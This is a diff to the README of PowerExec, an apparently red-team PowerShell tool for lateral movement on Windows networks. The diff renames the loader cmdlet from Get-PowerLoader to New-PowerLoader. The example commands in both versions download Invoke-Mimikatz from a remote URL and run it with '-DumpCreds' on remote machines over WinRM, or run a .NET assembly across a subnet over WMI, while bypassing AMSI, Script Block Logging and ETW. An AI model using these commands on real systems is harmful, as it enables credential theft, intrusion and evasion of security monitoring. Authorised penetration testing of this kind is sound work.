@@ -6,7 +6,7 @@ PowerExec is a PowerShell tool to move laterally on a Windows network.
 
 ```
 Invoke-PowerExec                -   execute PowerShell script block on remote computers through various techniques
-Get-PowerLoader                 -   build script block which safely loads PowerShell or .NET assembly
+New-PowerLoader                 -   build script block which safely loads PowerShell or .NET assembly
 ```
 
 ## Examples
@@ -14,13 +14,13 @@ Get-PowerLoader                 -   build script block which safely loads PowerS
 Run a PowerShell script through WinRM using a download cradle while bypassing Antimalware Scan Interface (AMSI) and Script Block Logging (SBL):
 
 ```
-PS C:\> Get-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -ArgumentList 'Invoke-Mimikatz -DumpCreds' -Bypass AMSI,SBL | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Protocol WinRM
+PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -ArgumentList 'Invoke-Mimikatz -DumpCreds' -Bypass AMSI,SBL | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Protocol WinRM
 ```
 
 Run a .NET assembly through WMI while bypassing AMSI and Event Tracing for Windows (ETW):
 
 ```
-PS C:\> Get-PowerLoader -Type NetAsm -FilePath .\sample.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.1.0/24 -Protocol WMI -Threads 10
+PS C:\> New-PowerLoader -Type NetAsm -FilePath .\sample.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.1.0/24 -Protocol WMI -Threads 10
 ```
 
 ## Credits
